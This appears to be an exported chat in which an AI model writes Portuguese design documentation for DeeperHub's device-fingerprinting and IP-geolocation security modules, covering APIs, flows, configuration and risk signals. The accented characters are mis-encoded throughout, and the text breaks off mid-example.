## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.Security.DeviceFingerprint`

O m√≥dulo `DeeperHub.Security.DeviceFingerprint` √© respons√°vel por gerar, comparar e gerenciar \"fingerprints\" (impress√µes digitais) de dispositivos dos usu√°rios. Uma fingerprint de dispositivo √© um identificador quasi-√∫nico gerado a partir de uma combina√ß√£o de caracter√≠sticas de hardware e software reportadas pelo cliente (navegador web, aplicativo mobile).

O objetivo principal √© ajudar a identificar e rastrear dispositivos que acessam o sistema DeeperHub, contribuindo para v√°rias medidas de seguran√ßa, como:
*   Detec√ß√£o de acesso por dispositivos novos ou n√£o reconhecidos.
*   Gerenciamento de dispositivos confi√°veis.
*   Preven√ß√£o de fraude e tomada de contas (Account Takeover - ATO).
*   Enriquecimento de dados para an√°lise de risco e comportamental.

Este m√≥dulo trabalha em conjunto com `DeeperHub.Security.DeviceService` (ou um componente similar dentro do `SecurityManager`) para associar fingerprints a dispositivos registrados e gerenciar seu status de confian√ßa. üòä

## üéØ 2. Responsabilidades e Funcionalidades Chave

*   **Gera√ß√£o de Fingerprint:**
    *   Coletar atributos do dispositivo do cliente (ex: User-Agent, resolu√ß√£o de tela, fontes instaladas, plugins, informa√ß√µes de hardware/software via APIs do navegador/SDK mobile).
    *   Processar e normalizar esses atributos.
    *   Gerar um hash est√°vel (ex: SHA-256) a partir dos atributos combinados para servir como a fingerprint (`generate_fingerprint/1`).
*   **Compara√ß√£o de Fingerprints:**
    *   Comparar duas fingerprints para determinar se provavelmente se referem ao mesmo dispositivo (`compare_fingerprints/2`).
    *   Considerar pequenas varia√ß√µes que podem ocorrer devido a atualiza√ß√µes de software ou navegador.
*   **Detec√ß√£o de Anomalias de Fingerprint:**
    *   Comparar a fingerprint de uma sess√£o atual com o hist√≥rico de fingerprints conhecidas para o usu√°rio (`detect_anomalies/3`).
    *   Sinalizar o uso de uma fingerprint completamente nova ou significativamente diferente.
*   **Verifica√ß√£o de Confian√ßa de Fingerprint:**
    *   Verificar se uma fingerprint corresponde a um dispositivo previamente marcado como confi√°vel pelo usu√°rio (`is_trusted_fingerprint/2`).
*   **Integra√ß√£o com `DeviceService`:**
    *   Fornecer fingerprints para o `DeviceService` registrar novos dispositivos.
    *   Consultar o `DeviceService` para verificar o status de confian√ßa de um dispositivo associado a uma fingerprint.
*   **Configurabilidade:**
    *   Permitir a configura√ß√£o de quais atributos do dispositivo s√£o usados na gera√ß√£o da fingerprint.
    *   Configurar a sensibilidade da compara√ß√£o de fingerprints.
*   **Evolu√ß√£o e Estabilidade da Fingerprint:**
    *   Implementar estrat√©gias para lidar com a evolu√ß√£o natural das fingerprints (ex: atualiza√ß√µes de navegador) sem gerar falsos positivos excessivos.

## üèóÔ∏è 3. Arquitetura e Design

O `DeeperHub.Security.DeviceFingerprint` √© primariamente um m√≥dulo funcional que fornece algoritmos e l√≥gica para trabalhar com fingerprints. Ele n√£o gerencia estado persistente de dispositivos diretamente, essa responsabilidade recai sobre o `DeviceService`.

### 3.1. Componentes Principais

1.  **`DeeperHub.Security.DeviceFingerprint` (M√≥dulo Funcional):**
    *   **Responsabilidade:** Cont√©m as fun√ß√µes principais para `generate_fingerprint/1`, `compare_fingerprints/2`, `detect_anomalies/3`, `is_trusted_fingerprint/2`.
    *   **Intera√ß√µes:**
        *   Recebe `device_info` (um mapa de atributos coletados do cliente).
        *   Pode interagir com `DeeperHub.Security.DeviceService` ou `DeeperHub.Core.Repo` para buscar hist√≥ricos de fingerprints de um usu√°rio ou dispositivos confi√°veis.
2.  **Coleta de Atributos no Cliente (Externo ao M√≥dulo Backend):**
    *   A coleta real dos atributos do dispositivo ocorre no lado do cliente (JavaScript no navegador, SDK no mobile). Bibliotecas como FingerprintJS, ClientJS podem ser usadas.
    *   Esses atributos s√£o enviados para o backend como parte das requisi√ß√µes (ex: login, ou uma chamada espec√≠fica de \"registro de dispositivo\").
3.  **`DeeperHub.Security.DeviceService` (ou parte do `SecurityManager`):**
    *   **Responsabilidade:** Gerenciar a persist√™ncia dos dispositivos registrados, suas fingerprints associadas e seu status de confian√ßa.
    *   **Intera√ß√µes:** Usa `DeviceFingerprint.generate_fingerprint/1` ao registrar um novo dispositivo. Armazena a fingerprint junto com os dados do dispositivo.

### 3.2. Estrutura de Diret√≥rios (Proposta)

Como √© um m√≥dulo mais focado em l√≥gica e algoritmos, pode ser mais simples:
```
lib/deeper_hub/security/
‚îú‚îÄ‚îÄ device_fingerprint.ex           # L√≥gica principal de fingerprinting
‚îî‚îÄ‚îÄ device_service.ex               # (Ou security_manager/services/device_service.ex)
                                    #  Gerencia a entidade \"Device\" e seu estado
```
Ou, se `DeviceService` for um componente maior:
```
lib/deeper_hub/security/device_management/  # Novo subm√≥dulo
‚îú‚îÄ‚îÄ device_fingerprint.ex
‚îú‚îÄ‚îÄ device_service.ex
‚îú‚îÄ‚îÄ schema/
‚îÇ   ‚îî‚îÄ‚îÄ device.ex
‚îî‚îÄ‚îÄ supervisor.ex
```

### 3.3. Decis√µes de Design Importantes

*   **Sele√ß√£o de Atributos:** A escolha dos atributos para compor a fingerprint √© crucial. Devem ser est√°veis o suficiente para n√£o mudarem constantemente, mas diversos o suficiente para fornecer uma boa unicidade. Evitar atributos muito vol√°teis ou facilmente falsific√°veis.
*   **Estabilidade vs. Unicidade:** H√° um trade-off. Fingerprints mais √∫nicas (usando mais atributos) tendem a ser menos est√°veis (mudam mais frequentemente). Fingerprints mais est√°veis podem ter maior chance de colis√£o.
*   **Hashing:** Usar um algoritmo de hash criptogr√°fico seguro (ex: SHA-256) para gerar a fingerprint final.
*   **Privacidade:** Ser transparente com o usu√°rio sobre a coleta de dados do dispositivo para fingerprinting. N√£o coletar mais dados do que o necess√°rio.
*   **N√£o √© Infal√≠vel:** Fingerprinting de dispositivo n√£o √© 100% √† prova de falsifica√ß√£o ou evas√£o, mas √© uma camada √∫til de seguran√ßa quando combinada com outras.

## üõ†Ô∏è 4. Casos de Uso Principais

*   **Detec√ß√£o de Novo Dispositivo no Login:**
    *   Usu√°rio tenta fazer login. O cliente envia `device_info`.
    *   O backend gera uma fingerprint usando `DeviceFingerprint.generate_fingerprint(device_info)`.
    *   `DeviceFingerprint.detect_anomalies(user_id, current_fingerprint, historical_fingerprints_from_db)` √© chamado.
    *   Se a fingerprint for nova ou significativamente diferente, isso contribui para o score de risco do `RiskAssessment`.
*   **Registro de Dispositivo Confi√°vel:**
    *   Ap√≥s um login bem-sucedido, o usu√°rio opta por \"confiar neste dispositivo\".
    *   O cliente envia `device_info`.
    *   O backend gera a fingerprint.
    *   `DeeperHub.Security.DeviceService.trust_device(user_id, fingerprint, device_name)` √© chamado para armazenar a fingerprint como confi√°vel.
*   **Pular MFA para Dispositivos Confi√°veis:**
    *   Durante o login, se a fingerprint do dispositivo atual corresponder a uma fingerprint confi√°vel para o usu√°rio (`DeviceFingerprint.is_trusted_fingerprint/2`), o sistema pode optar por n√£o exigir MFA, mesmo que configurado (dependendo da pol√≠tica de risco).

## üåä 5. Fluxos Importantes

### Fluxo de Gera√ß√£o e Verifica√ß√£o de Fingerprint no Login

1.  **Coleta no Cliente:** JavaScript no navegador (ou SDK mobile) coleta atributos do dispositivo.
2.  **Envio para o Backend:** Os atributos s√£o enviados para o backend durante a tentativa de login.
3.  **`DeeperHub.Auth.Services.LoginService` (ou `SecurityManager`):**
    *   Recebe `device_info` como parte dos dados de login.
    *   Chama `DeeperHub.Security.DeviceFingerprint.generate_fingerprint(device_info)` para obter a `current_fingerprint`.
4.  **`DeeperHub.Security.DeviceFingerprint.generate_fingerprint/1`:**
    *   Seleciona um subconjunto de atributos de `device_info` (configur√°vel).
    *   Normaliza os valores (ex: lowercase, ordena√ß√£o).
    *   Concatena os valores normalizados em uma string.
    *   Calcula o hash (ex: SHA-256) da string concatenada.
    *   Retorna o hash como a fingerprint.
5.  **`DeeperHub.Auth.Services.LoginService` (ou `SecurityManager`):**
    *   Recupera as fingerprints hist√≥ricas e confi√°veis para o `user_id` do `DeviceService` (que consulta o DB).
    *   Chama `DeeperHub.Security.DeviceFingerprint.is_trusted_fingerprint(current_fingerprint, trusted_fingerprints_for_user)`.
    *   Chama `DeeperHub.Security.DeviceFingerprint.detect_anomalies(user_id, current_fingerprint, historical_fingerprints)`.
    *   Os resultados (`is_trusted`, `is_new_device`) s√£o passados para `DeeperHub.Security.RiskAssessment` como fatores de risco.
6.  **(P√≥s-Login bem-sucedido, se o dispositivo for novo e o usu√°rio optar por registrar/confiar):**
    *   `DeeperHub.Security.DeviceService.register_or_update_device(user_id, current_fingerprint, device_info_attributes, is_trusted: true)`.

## üì° 6. API (Fun√ß√µes P√∫blicas do M√≥dulo)

### 6.1. `DeeperHub.Security.DeviceFingerprint.generate_fingerprint(device_info :: map()) :: {:ok, String.t()} | {:error, :missing_attributes | term()}`

*   **Descri√ß√£o:** Gera uma fingerprint de dispositivo a partir de um mapa de atributos.
*   **`device_info`:** Mapa contendo atributos coletados do cliente (ex: `%{user_agent: \"...\", screen_resolution: \"1920x1080\", timezone: \"America/New_York\", plugins: [\"...\", \"...\"], canvas_fingerprint: \"...\", ...}`).
*   **Retorno:**
    *   `{:ok, fingerprint_string}`: A fingerprint gerada.
    *   `{:error, :missing_attributes}`: Se atributos essenciais para a gera√ß√£o n√£o forem fornecidos.
    *   `{:error, reason}`: Outros erros.
*   **Exemplo:**
    ```elixir
    device_attrs = %{user_agent: \"...\", screen_width: 1920, screen_height: 1080}
    {:ok, fp} = DeeperHub.Security.DeviceFingerprint.generate_fingerprint(device_attrs)
    ```

### 6.2. `DeeperHub.Security.DeviceFingerprint.compare_fingerprints(fp1 :: String.t(), fp2 :: String.t(), opts :: keyword()) :: {:ok, :match | :partial_match | :no_match, float() | nil}`

*   **Descri√ß√£o:** Compara duas fingerprints e retorna o n√≠vel de correspond√™ncia.
*   **`opts`:**
    *   `:sensitivity` (Float): Limiar para considerar `partial_match` (0.0 a 1.0).
*   **Retorno:**
    *   `{:ok, :match, 1.0}`: Correspond√™ncia exata.
    *   `{:ok, :partial_match, score}`: Correspond√™ncia parcial com um score de similaridade.
    *   `{:ok, :no_match, score}`: Nenhuma correspond√™ncia.
*   *(Nota: A implementa√ß√£o de `partial_match` pode ser complexa e depender de algoritmos de similaridade de string ou an√°lise dos atributos que diferem.)*

### 6.3. `DeeperHub.Security.DeviceFingerprint.detect_anomalies(user_id :: String.t(), current_fingerprint :: String.t(), historical_fingerprints :: list(String.t())) :: {:ok, %{is_new_device: boolean(), is_significantly_different: boolean(), confidence: float()}}`

*   **Descri√ß√£o:** Compara a fingerprint atual com um conjunto de fingerprints hist√≥ricas do usu√°rio.
*   **Retorno:**
    *   `is_new_device`: `true` se `current_fingerprint` n√£o estiver em `historical_fingerprints`.
    *   `is_significantly_different`: `true` se `current_fingerprint` for nova e/ou muito diferente das hist√≥ricas (usando `compare_fingerprints`).
    *   `confidence`: Confian√ßa na detec√ß√£o da anomalia.

### 6.4. `DeeperHub.Security.DeviceFingerprint.is_trusted_fingerprint(user_id :: String.t(), current_fingerprint :: String.t()) :: boolean()`

*   **Descri√ß√£o:** Verifica se a `current_fingerprint` corresponde a alguma fingerprint de um dispositivo marcado como confi√°vel para o `user_id`.
*   **(Delega√ß√£o):** Esta fun√ß√£o provavelmente chamaria `DeeperHub.Security.DeviceService.list_trusted_devices(user_id)` e ent√£o compararia as fingerprints.

## ‚öôÔ∏è 7. Configura√ß√£o

Via `DeeperHub.Core.ConfigManager` e/ou `DeeperHub.Security.Policy.SecurityPolicyManager`:

*   **`[:security, :device_fingerprint, :enabled]`** (Boolean): Habilita/desabilita o sistema de fingerprinting. (Padr√£o: `true`)
*   **`[:security, :device_fingerprint, :attributes_to_use]`** (List de Atoms/Strings): Lista de chaves de `device_info` que ser√£o usadas para gerar a fingerprint.
    *   Ex: `[:user_agent, :screen_resolution, :timezone, :language, :platform, :canvas_hash]`
*   **`[:security, :device_fingerprint, :hash_algorithm]`** (Atom): Algoritmo de hash a ser usado (ex: `:sha256`). (Padr√£o: `:sha256`)
*   **`[:security, :device_fingerprint, :comparison_sensitivity]`** (Float): Limiar de sensibilidade para `compare_fingerprints/2` ao considerar uma correspond√™ncia parcial. (Padr√£o: `0.85`)
*   **`[:security, :device_fingerprint, :new_device_risk_penalty]`** (Integer): Penalidade de risco a ser adicionada ao `RiskAssessment` quando um novo dispositivo √© detectado.

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   `DeeperHub.Core.ConfigManager`: Para configura√ß√µes.
*   `DeeperHub.Core.Logger`: Para logging.
*   `DeeperHub.Core.Metrics`: Para m√©tricas.
*   `DeeperHub.Security.DeviceService` (ou componente do `SecurityManager`): Para persistir e consultar dispositivos registrados e seu status de confian√ßa.
*   `DeeperHub.Shared.Utils.SecurityUtils` (ou `Core.EncryptionService` se a fingerprint em si precisar ser hasheada de uma forma espec√≠fica, embora geralmente o resultado do hash dos atributos j√° seja a fingerprint).

### 8.2. Bibliotecas Externas

*   Nenhuma depend√™ncia externa direta √© estritamente necess√°ria para a gera√ß√£o do hash em si (Erlang `:crypto` pode ser usado). Bibliotecas de parsing de User-Agent podem ser √∫teis se essa informa√ß√£o for usada de forma mais granular.

## ü§ù 9. Como Usar / Integra√ß√£o

*   **Coleta no Frontend/Mobile:** Implementar a coleta dos atributos do dispositivo no cliente.
*   **Envio para Backend:** Enviar o mapa `device_info` para os endpoints relevantes do backend (ex: login, registro de dispositivo).
*   **No Backend:**
    ```elixir
    def handle_login(params, user_id) do
      device_info = Map.get(params, \"device_info\", %{})
      {:ok, current_fp} = DeeperHub.Security.DeviceFingerprint.generate_fingerprint(device_info)
      
      is_trusted = DeeperHub.Security.DeviceFingerprint.is_trusted_fingerprint(user_id, current_fp)
      # Ou, melhor, via DeviceService:
      # {:ok, device_status} = DeeperHub.Security.DeviceService.get_device_status_by_fp(user_id, current_fp)
      # is_trusted = device_status == :trusted

      # Passar current_fp, is_trusted para RiskAssessment
      # ...
    end
    ```

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar a gera√ß√£o de fingerprints com diferentes conjuntos de `device_info`.
*   Testar a estabilidade da fingerprint (pequenas mudan√ßas em `device_info` n√£o devem sempre gerar uma nova fingerprint, dependendo dos atributos usados).
*   Testar a compara√ß√£o de fingerprints (exata, nenhuma).
*   Testar a detec√ß√£o de anomalias (novo dispositivo vs. dispositivo conhecido).
*   Localiza√ß√£o: `test/deeper_hub/security/device_fingerprint/`.

### 10.2. M√©tricas

*   `deeper_hub.security.device_fingerprint.generated.count`
*   `deeper_hub.security.device_fingerprint.comparisons.count` (tags: `result` (`match`, `no_match`))
*   `deeper_hub.security.device_fingerprint.anomalies_detected.count` (tags: `type` (`new_device`))
*   `deeper_hub.security.device_fingerprint.trusted_checks.count` (tags: `result` (`trusted`, `not_trusted`))

### 10.3. Logs

*   **N√≠vel DEBUG:** Detalhes dos atributos usados para gerar uma fingerprint espec√≠fica.
*   **N√≠vel INFO:** Nova fingerprint detectada para um usu√°rio. Fingerprint verificada como confi√°vel.
*   **N√≠vel WARNING:** Falha ao gerar fingerprint devido a atributos ausentes.

### 10.4. Telemetria

*   `[:deeper_hub, :security, :device_fingerprint, :generation, :start | :stop | :exception]`
    *   Metadados: `%{input_attribute_keys: keys(device_info)}`
    *   No `:stop`: `%{fingerprint: fp_string}`
*   `[:deeper_hub, :security, :device_fingerprint, :anomaly_check, :stop]`
    *   Metadados: `%{user_id: id, current_fp: fp, result: %{is_new: ...}}`

## ‚ùå 11. Tratamento de Erros

*   Falha na coleta de atributos no cliente: O sistema deve lidar graciosamente com `device_info` incompleto ou ausente, possivelmente atribuindo um risco maior ou usando uma fingerprint gen√©rica/nula.
*   Se a gera√ß√£o da fingerprint falhar no backend, isso deve ser logado, e a avalia√ß√£o de risco pode prosseguir sem esse fator ou com um fator de risco de \"dispositivo desconhecido\".

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa (do pr√≥prio M√≥dulo)

*   **N√£o Confiar Cegamente na Fingerprint:** Fingerprints de dispositivo podem ser falsificadas ou contornadas por atacantes determinados. Elas devem ser usadas como *um* dos muitos sinais em uma estrat√©gia de defesa em profundidade, n√£o como o √∫nico mecanismo de identifica√ß√£o de dispositivo.
*   **Rota√ß√£o de Atributos:** Alguns atributos usados na fingerprint podem mudar com o tempo (ex: vers√£o do navegador). O algoritmo deve ser robusto a pequenas mudan√ßas ou ter uma estrat√©gia para \"envelhecer\" ou \"agrupar\" fingerprints similares.
*   **Armazenamento de Fingerprints:** Embora a fingerprint seja um hash, se muitas fingerprints hist√≥ricas de um usu√°rio forem comprometidas, elas poderiam, teoricamente, ser usadas para tentar adivinhar alguns dos atributos do dispositivo.

## üßë‚Äçüíª 13. Contribui√ß√£o

*   A escolha dos atributos em `[:security, :device_fingerprint, :attributes_to_use]` √© cr√≠tica e deve ser balanceada entre unicidade e estabilidade.
*   Documentar claramente quais atributos s√£o esperados do cliente.

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Implementar algoritmos mais sofisticados para `compare_fingerprints/2` que possam dar um score de similaridade baseado nos atributos que diferem, em vez de apenas correspond√™ncia exata do hash.
*   [ ] Adicionar um mecanismo para \"aprender\" e \"envelhecer\" fingerprints, permitindo que mudan√ßas graduais no dispositivo de um usu√°rio n√£o o classifiquem imediatamente como \"novo\".
*   [ ] Integrar com bibliotecas de fingerprinting de servidor que podem inferir alguns atributos do dispositivo a partir dos headers da requisi√ß√£o HTTP, como um fallback ou complemento.
*   [ ] Desenvolver estrat√©gias para lidar com usu√°rios que usam navegadores com forte prote√ß√£o anti-fingerprinting (ex: Tor Browser, Brave com configura√ß√µes restritas).
*   [ ] Permitir que usu√°rios gerenciem seus dispositivos registrados e \"confi√°veis\" atrav√©s de uma interface.

---

*√öltima atualiza√ß√£o: 2025-05-11*

---

Agora, com a fingerprint do dispositivo documentada, faz sentido ir para `DeeperHub.Security.GeoLocationService` para completar o contexto da requisi√ß√£o, ou prefere outro rumo?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Perfeito! Vamos detalhar o `DeeperHub.Security.GeoLocationService`. Este servi√ßo √© essencial para entender o contexto geogr√°fico das intera√ß√µes do usu√°rio, o que √© um fator importante para `RiskAssessment` e `FraudDetection`.

---

# M√≥dulo: `DeeperHub.Security.GeoLocationService` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.Security.GeoLocationService`

O m√≥dulo `DeeperHub.Security.GeoLocationService` √© respons√°vel por obter, analisar e gerenciar informa√ß√µes de geolocaliza√ß√£o associadas a endere√ßos IP dos usu√°rios que interagem com o sistema DeeperHub. Ele fornece dados como pa√≠s, regi√£o, cidade e, potencialmente, provedor de internet (ISP) e informa√ß√µes de ASN (Autonomous System Number) para um determinado IP.

Essas informa√ß√µes s√£o cruciais para v√°rias funcionalidades de seguran√ßa, incluindo:
*   Detec√ß√£o de logins de locais incomuns ou de alto risco.
*   An√°lise de \"viagens imposs√≠veis\" (quando um usu√°rio parece logar de locais geograficamente distantes em um curto per√≠odo).
*   Enriquecimento de dados para avalia√ß√£o de risco e detec√ß√£o de fraude.
*   Aplica√ß√£o de pol√≠ticas de acesso baseadas em geolocaliza√ß√£o.

Este m√≥dulo tipicamente integra-se com servi√ßos de GeoIP externos (como MaxMind GeoIP2, IPinfo.io, etc.) e/ou utiliza bases de dados GeoIP locais, com mecanismos de cache e circuit breaker para garantir performance e resili√™ncia. üòä

## üéØ 2. Responsabilidades e Funcionalidades Chave

*   **Lookup de IP para Geolocaliza√ß√£o (`get_location/1` ou `lookup_ip/2`):**
    *   Obter dados de geolocaliza√ß√£o (pa√≠s, cidade, regi√£o, coordenadas, ISP, ASN) para um endere√ßo IP.
    *   Suporte a diferentes provedores de GeoIP (externos ou bases de dados locais).
*   **Cache de Resultados de Geolocaliza√ß√£o:**
    *   Armazenar em cache os resultados de lookups de IP para reduzir a lat√™ncia e o custo de chamadas a servi√ßos externos (via `DeeperHub.Security.Cache.GeoCache` ou similar).
*   **Prote√ß√£o com Circuit Breaker:**
    *   Integrar com `DeeperHub.Core.CircuitBreakerFactory` ao chamar servi√ßos GeoIP externos para prevenir falhas em cascata.
*   **An√°lise de Risco de Localiza√ß√£o (`assess_location_risk/3`):**
    *   Avaliar o risco associado a uma determinada localiza√ß√£o (ex: pa√≠s de alto risco, proxy conhecido, Tor exit node).
*   **Detec√ß√£o de Viagem Imposs√≠vel (`is_impossible_travel?/3`):**
    *   Comparar a localiza√ß√£o atual de um login com localiza√ß√µes anteriores para detectar movimentos geograficamente implaus√≠veis em um curto per√≠odo.
*   **Gerenciamento de Localiza√ß√µes Confi√°veis e Bloqueadas (Integra√ß√£o):**
    *   Permitir que usu√°rios ou administradores marquem certas localiza√ß√µes (ou pa√≠ses/regi√µes) como confi√°veis ou bloqueadas (l√≥gica gerenciada por `DeeperHub.SessionPolicy` ou `SecurityPolicyManager`).
    *   Validar se um IP pertence a uma lista de pa√≠ses permitidos/bloqueados.
*   **Atualiza√ß√£o de Bases de Dados GeoIP (se locais):**
    *   Fornecer mecanismos ou recomendar processos para manter as bases de dados GeoIP locais atualizadas.
*   **Observabilidade:**
    *   Registrar m√©tricas sobre lookups, acertos/erros de cache, lat√™ncia de provedores externos.
    *   Logar erros e atividades importantes.

## üèóÔ∏è 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Security.GeoLocationService` (Fachada P√∫blica):**
    *   Ponto de entrada para todas as funcionalidades de geolocaliza√ß√£o.
    *   Delega para um `GeoLocationAdapter` ou diretamente para um servi√ßo interno.
2.  **`DeeperHub.Security.GeoLocationService.Adapter` (Behaviour e Implementa√ß√µes):**
    *   **Responsabilidade:** Abstrair a intera√ß√£o com diferentes provedores de GeoIP.
    *   **Implementa√ß√µes:**
        *   `MaxMindAdapter`: Para interagir com a API ou base de dados MaxMind GeoIP2.
        *   `IPinfoAdapter`: Para interagir com a API IPinfo.io.
        *   `LocalDbAdapter`: Para consultar uma base de dados GeoIP local (ex: baixada e atualizada periodicamente).
        *   `CompositeAdapter`: Para tentar m√∫ltiplos provedores em uma ordem de preced√™ncia.
3.  **`DeeperHub.Core.CircuitBreakerFactory` e Circuit Breakers espec√≠ficos por provedor:**
    *   Usados pelos adaptadores de provedores externos para proteger o sistema.
    *   Exemplo: `DeeperHub.Infrastructure.GeoIP.GeoIPServiceWithCircuitBreaker` (da documenta√ß√£o original) pode ser renomeado ou integrado aqui.
4.  **`DeeperHub.Security.Cache.GeoCache` (GenServer ou ETS direta):**
    *   Armazena em cache os resultados de lookups de IP para evitar chamadas repetidas a servi√ßos externos.
5.  **`DeeperHub.Security.GeoLocationService.RiskAnalyzer` (M√≥dulo Funcional):**
    *   Cont√©m a l√≥gica para `assess_location_risk/3` e `is_impossible_travel?/3`.
    *   Pode consultar listas de pa√≠ses de alto risco, proxies conhecidos, etc. (configur√°veis).
6.  **`DeeperHub.Security.LoginLocation.Schema.LocationHistory` e `TrustedLocation` (se persist√™ncia for usada):**
    *   Schemas Ecto para armazenar o hist√≥rico de login de usu√°rios e localiza√ß√µes confi√°veis. A l√≥gica de grava√ß√£o/leitura seria gerenciada por um servi√ßo como `LoginLocationService` ou diretamente pelo `RiskAnalyzer`.
7.  **Configura√ß√µes (via `DeeperHub.Core.ConfigManager` e `DeeperHub.Security.Policy.SecurityPolicyManager`):**
    *   Chaves de API para servi√ßos GeoIP externos.
    *   Caminhos para bases de dados GeoIP locais.
    *   Configura√ß√µes de cache (TTL).
    *   Listas de pa√≠ses de alto risco.
    *   Limiares para detec√ß√£o de viagem imposs√≠vel (velocidade m√°xima).

### 3.2. Estrutura de Diret√≥rios (Proposta)

```
lib/deeper_hub/security/geo_location_service/ # Ou apenas geo_location.ex se for mais simples
‚îú‚îÄ‚îÄ geo_location_service.ex         # Fachada P√∫blica
‚îÇ
‚îú‚îÄ‚îÄ adapters/                       # Adaptadores para diferentes provedores GeoIP
‚îÇ   ‚îú‚îÄ‚îÄ geo_location_adapter.ex     # Behaviour
‚îÇ   ‚îú‚îÄ‚îÄ maxmind_adapter.ex
‚îÇ   ‚îú‚îÄ‚îÄ ipinfo_adapter.ex
‚îÇ   ‚îî‚îÄ‚îÄ local_db_adapter.ex
‚îÇ   ‚îî‚îÄ‚îÄ composite_adapter.ex          # (Gerencia m√∫ltiplos provedores)
‚îÇ
‚îú‚îÄ‚îÄ risk_analyzer.ex                # L√≥gica para assess_location_risk, is_impossible_travel
‚îú‚îÄ‚îÄ cache/                          # Cache espec√≠fico para GeoLocation
‚îÇ   ‚îî‚îÄ‚îÄ geo_cache.ex                # (Pode reusar Core.Cache com namespace ou ser espec√≠fico)
‚îÇ
‚îú‚îÄ‚îÄ supervisor.ex                   # Supervisor para processos do GeoLocation (ex: Cache)
‚îî‚îÄ‚îÄ telemetry.ex
```
*(Nota: O m√≥dulo `DeeperHub.LoginLocation` da documenta√ß√£o original parece ter responsabilidades sobrepostas. A geolocaliza√ß√£o de um IP √© uma fun√ß√£o, enquanto rastrear e analisar os *logins* de um *usu√°rio* em diferentes localiza√ß√µes √© outra. Podemos manter `GeoLocationService` focado no lookup de IP e na an√°lise de risco da localiza√ß√£o em si, e `LoginLocation` (ou um `UserLocationHistoryService`) focado no hist√≥rico e padr√µes do usu√°rio.)*

### 3.3. Decis√µes de Design Importantes

*   **Abstra√ß√£o de Provedor:** Isolar a l√≥gica de intera√ß√£o com provedores GeoIP espec√≠ficos em adaptadores facilita a troca ou adi√ß√£o de provedores.
*   **Resili√™ncia:** O uso de Circuit Breakers e cache √© essencial para lidar com a indisponibilidade ou lat√™ncia de servi√ßos externos.
*   **Fallback:** Ter uma base de dados GeoIP local como fallback (mesmo que menos precisa) pode ser √∫til se os servi√ßos externos falharem.
*   **Atualiza√ß√£o de Dados:** Bases de dados GeoIP mudam. Um processo para atualiz√°-las regularmente √© necess√°rio se forem usadas localmente.

## üõ†Ô∏è 4. Casos de Uso Principais

*   **Verificar Localiza√ß√£o de um Novo Login:**
    *   `DeeperHub.Auth` recebe um IP durante o login.
    *   Chama `GeoLocationService.get_location(ip_address)`.
    *   O resultado √© usado pelo `RiskAssessment` para avaliar o risco do login.
*   **Detectar Viagem Imposs√≠vel:**
    *   Ap√≥s um login bem-sucedido, o `RiskAssessment` ou `Auth` obt√©m a localiza√ß√£o atual e a compara com a √∫ltima localiza√ß√£o conhecida do usu√°rio usando `GeoLocationService.is_impossible_travel?(last_location, current_location, time_diff)`.
*   **Bloquear Acesso de Pa√≠ses de Alto Risco:**
    *   Um Plug de seguran√ßa chama `GeoLocationService.assess_location_risk(ip_info)`.
    *   Se o risco for cr√≠tico devido ao pa√≠s, a requisi√ß√£o pode ser bloqueada.
*   **Enriquecer Logs de Auditoria:**
    *   `DeeperHub.Audit` usa o `GeoLocationService` para adicionar informa√ß√µes de pa√≠s/cidade aos logs de eventos.

## üåä 5. Fluxos Importantes

### Fluxo de Lookup de IP (`get_location/1`)

1.  **Chamador:** Um m√≥dulo (ex: `RiskAssessment`) chama `GeoLocationService.get_location(ip_address)`.
2.  **`GeoLocationService` (Fachada):**
    *   Primeiro, tenta obter os dados do `GeoCache.get(ip_address)`.
3.  **`GeoCache`:**
    *   **Cache Hit:** Se encontrado e n√£o expirado, retorna `{:ok, geo_data}` para a fachada.
    *   **Cache Miss:** Retorna `{:error, :not_found}`.
4.  **`GeoLocationService` (Fachada, em caso de Cache Miss):**
    *   Seleciona o `GeoLocationAdapter` configurado (ex: `CompositeAdapter`).
5.  **`GeoLocationAdapter` (ex: `CompositeAdapter`):**
    *   Tenta o primeiro provedor configurado (ex: `MaxMindAdapter`).
        *   **`MaxMindAdapter`:**
            *   Executa a chamada √† API MaxMind (ou consulta DB local) atrav√©s de um `CircuitBreaker`.
            *   **Sucesso:** Retorna `{:ok, geo_data_from_maxmind}`.
            *   **Falha (API/Circuito Aberto):** Tenta o pr√≥ximo provedor no `CompositeAdapter`.
    *   Se um provedor retornar sucesso:
        *   `GeoCache.put(ip_address, geo_data_from_provider, ttl_configurado)`.
        *   Retorna `{:ok, geo_data_from_provider}` para a fachada.
    *   Se todos os provedores falharem:
        *   (Opcional) Tenta um fallback para uma base de dados local menos precisa.
        *   Retorna `{:error, :all_providers_failed_or_unavailable}`.
6.  **`GeoLocationService` (Fachada):** Retorna o resultado para o chamador.

## üì° 6. API (Fun√ß√µes P√∫blicas da Fachada)

### 6.1. `DeeperHub.Security.GeoLocationService.get_location(ip_address :: String.t(), opts :: keyword()) :: {:ok, GeoData.t()} | {:error, reason :: atom()}`

*   **Descri√ß√£o:** Obt√©m dados de geolocaliza√ß√£o para um endere√ßo IP.
*   **`opts`:**
    *   `:provider_preference` (list(atom)): Ordem de prefer√™ncia dos provedores (ex: `[:maxmind, :ipinfo]`).
    *   `:skip_cache` (boolean): Se `true`, ignora o cache. (Padr√£o: `false`)
    *   `:timeout_ms` (integer): Timeout para provedores externos.
*   **`GeoData.t()`:** `%{ip_address: String.t(), country_code: String.t() | nil, country_name: String.t() | nil, region_code: String.t() | nil, region_name: String.t() | nil, city_name: String.t() | nil, postal_code: String.t() | nil, latitude: float() | nil, longitude: float() | nil, timezone: String.t() | nil, isp: String.t() | nil, organization: String.t() | nil, asn: String.t() | nil, is_proxy: boolean() | nil, is_tor_node: boolean() | nil, source_provider: atom()}`
*   **Retorno de Erro:** `:invalid_ip_format`, `:provider_unavailable`, `:lookup_failed`, `:cache_error`.
*   **Exemplo:**
    ```elixir
    case GeoLocationService.get_location(\"8.8.8.8\") do
